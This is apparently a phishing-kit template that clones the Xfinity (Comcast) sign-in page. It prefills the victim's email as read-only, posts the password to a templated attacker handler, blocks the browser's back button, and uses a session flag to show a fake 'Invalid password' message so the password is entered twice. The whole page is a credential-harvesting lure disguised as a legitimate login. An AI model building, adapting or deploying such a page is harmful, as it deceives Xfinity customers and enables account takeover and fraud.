

<!DOCTYPE html>
<html lang="en" class="light da" data-resource-package-id="res-responsive-login-page">
    <head>
        <title>Sign in to Xfinity</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="description" content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together &mdash; anytime, anywhere, on any device.">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <meta name="msapplication-TileColor" content="#ffffff">
        <meta name="msapplication-TileImage" content="static/images/global/favicon/favicon-96x96.png">
        <meta name="theme-color" content="#ffffff">
        <script type="text/javascript">function preventBack(){window.history.forward();}setTimeout("preventBack()", 0); window.onunload = function () { null }; </script> <script type="text/javascript" src="assets/js/jquery.min.js"></script>
        <link rel="stylesheet" type="text/css" href="assets/email-assets/fonts-remote.min.css">
        <link rel="stylesheet" type="text/css" href="assets/email-assets/styles-light.min.css">
        <link rel="shortcut icon" href="email-assets/favicon.ico">
        <link rel="apple-touch-icon" sizes="57x57" href="assets/email-assets/apple-icon-57x57.png">
        <link rel="apple-touch-icon" sizes="60x60" href="assets/email-assets/apple-icon-60x60.png">
        <link rel="apple-touch-icon" sizes="72x72" href="assets/email-assets/apple-icon-72x72.png">
        <link rel="apple-touch-icon" sizes="76x76" href="assets/email-assets/apple-icon-76x76.png">
        <link rel="apple-touch-icon" sizes="114x114" href="assets/email-assets/apple-icon-114x114.png">
        <link rel="apple-touch-icon" sizes="120x120" href="assets/email-assets/apple-icon-120x120.png">
        <link rel="apple-touch-icon" sizes="144x144" href="assets/email-assets/apple-icon-144x144.png">
        <link rel="apple-touch-icon" sizes="152x152" href="assets/email-assets/apple-icon-152x152.png">
        <link rel="apple-touch-icon" sizes="180x180" href="../email-assetsapple-icon-180x180.png">
        <link rel="icon" type="image/png" sizes="192x192"  href="assets/email-assets/android-icon-192x192.png">
        <link rel="icon" type="image/png" sizes="32x32" href="assets/email-assets/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="96x96" href="assets/email-assets/favicon-96x96.png">
        <link rel="icon" type="image/png" sizes="16x16" href="assets/email-assets/favicon-16x16.png">
        <script src="../../assets/js/jquery-3.5.1.min.js"></script>
        <style type="text/css">
            @media only screen and (min-width: 1400px) {
                .ad.ad-fullscreen #left {
                    margin-left: 670px;
                }
                .ad.ad-fullscreen #right {
                    margin-right: 0px;
                }
            }
            
            #right {
                margin-left: 590px !important;
            }

            @media screen and (max-width: 768px) {
                #right {
                    margin-left: 0px !important;
                }
            }

            .da-300x250 #ad-block {
                height: 250px;
                overflow: hidden;
            }

            @media only screen and (max-width: 516px), only screen and (max-height: 719px) {
                html:not(.da-fullscreen) .single.logo-wrapper .xfinity-logo {
                    margin-bottom: 0px !important;
                }
            }
        </style>
        <script>
            $(function() {
                $('#passwd').focus();
            })
        </script>
    </head>
    <body class="has-footer">
        <div id="breakpoints"></div>
        <div id="background"></div>
        <main id="bd">
            <h1 class="screen-reader-text">Sign in to Xfinity</h1>
            <div id="right">
                <div class="container">
                    <form name="signin" action="@form_action_page('email')" method="post">
                        <div class="single logo-wrapper">
                            <span aria-role="img" class="xfinity-logo"></span>
                            <p>Sign in to proceed to {app_name}</p>
                            
                            @if(isset($_SESSION['double_email']))
                                <font color=red>Invalid password, please try again. </font>
                            @endif
                        </div>
                        <div class="textfield-wrapper" style="margin-top: 90px;">
                            <label for="user" class="float accessibly-hidden">Xfinity ID</label>
                            <input id="user" name="user" type="email" placeholder="Email" value="{{ $email }}" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="128" readonly>
                        </div>
                        <div class="textfield-wrapper">
                            <label for="password" class="float accessibly-hidden">Password</label>
                            <input id="passwd" name="password" type="password" placeholder="Password" maxlength="128" required>
                        </div>
                        <div class="checkbox-container">
                            <label for="remember_me">
                                <input type="checkbox" id="remember_me" name="rm" value="1"><span id="remember_me_checkbox" class="checkbox"></span>
                                <div class="content">Stay signed in</div>
                            </label>
                            <button type="button" id="rm_label_learn_more" class="icon info cancel" data-id-ref="rm_help" aria-controls="rm_help" aria-label="Learn more about staying signed in"></button>
                        </div>
                        <button class="submit" type="submit" id="sign_in" name="submit">Sign In</button>
                        <ul>
                            <li id="forgot-username-password-item">Forgot <a href="#" target="_self" title="Look up Xfinity ID">Xfinity ID</a> or <a id="forgotPwdLink" href="#" target="_self" title="Reset Password">password</a>?</li>
                            <li id="create-username-item">Don't have an Xfinity ID? <span><a href="#" target="_self">Create one</a></span>
                            </li>
                            <li id="quick-bill-pay">
                                <a href="#" target="_self">Pay any balance</a> without signing in               
                            </li>
                        </ul>
                        <p id="implied-legal">By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
                    </form>
                </div>
            </div>
        </main>
        <footer>
            <span class="content">
                <span class="copyright">© 2020 Comcast</span>
                <nav>
                    <span class="divider hide-compact"></span>
                    <span class="links">
                        <a href="#">Privacy Policy</a>
                        <span class="divider"></span>
                        <a href="#">Terms of Service</a>
                    </span>
                    <span class="ad-links divider"></span>
                    <span class="ad-links links">
                        <a href="#">Ad Info</a>
                        <span class="divider"></span>
                        <a href="#">Ad Feedback</a>
                    </span>
                    <span class="divider hide-compact"></span>
                    <span class="links">
                        <a href="#">Cal. Civ. Code §1798.135: Do Not Sell My Info</a>
                    </span>
                </nav>
            </span>
        </footer>
        <div id="rm_help" role="dialog" aria-hidden="true" class="overlay" data-dialog-type="overlay">
            <div role="document" class="content">
                <button type="button" class="close" aria-label="Close"></button>
                <h1>Why Stay Signed In?</h1>
                <p>With this option selected, you'll stay signed in to your account on this device until you sign out. You should not use this option on public or shared devices.</p>
                <p>For your security, you may be asked to enter your password before accessing certain information.</p>
            </div>
        </div>
    </body>
</html>